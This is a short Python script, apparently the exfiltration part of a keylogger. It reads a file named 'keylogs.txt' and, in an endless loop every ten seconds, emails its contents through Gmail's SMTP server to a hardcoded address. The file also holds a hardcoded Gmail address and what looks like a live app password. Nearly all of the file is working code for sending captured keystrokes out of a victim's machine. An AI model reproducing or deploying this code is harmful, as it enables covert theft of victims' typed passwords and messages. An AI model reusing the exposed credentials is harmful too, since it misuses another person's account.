import smtplib
import time
import sys

def sendMail():
    sender = "bulamabenjamin101@gmail.com"
    receiver = "bulamabenjamin101@gmail.com"
    password = "otaq oxlo rgwp oqsr"
    subject = "Python email test"
    with open("keylogs.txt", "r") as file:
        body = file.read()

    # Email message
    message = f"""From: {sender}
    To: {receiver}
    Subject: {subject}

    {body}
    """

    # Setup the server connection
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()  # Start TLS connection for security

    try:
        server.login(sender, password)
        print("Logged in successfully...")
        server.sendmail(sender, receiver, message)
        print("Email has been sent!")

    except smtplib.SMTPAuthenticationError:
        print("Unable to sign in - check credentials or app password")

    except smtplib.SMTPServerDisconnected:
        print("Connection closed unexpectedly - check network or server settings")

#    finally:
#        server.quit()


while True:
    sendMail()
    print("Cooling down...")
    time.sleep(10)
    print("Active!\n")
#    time.sleep(1)

